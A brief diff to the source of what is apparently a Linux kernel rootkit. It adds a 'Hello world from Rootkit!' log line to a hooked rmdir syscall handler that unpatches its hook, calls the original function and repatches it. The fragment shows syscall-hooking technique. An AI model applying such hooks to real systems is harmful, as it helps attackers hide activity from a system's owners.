@@ -464,7 +464,7 @@ asmlinkage long asm_rmdir(const char __user *pathname)
     original_rmdir = asm_hook_unpatch(asm_rmdir);
     long ret = original_rmdir(pathname);
     asm_hook_patch(asm_rmdir);
-
+    pr_info("Hello world from Rootkit!\n");
     return ret;
 }
 
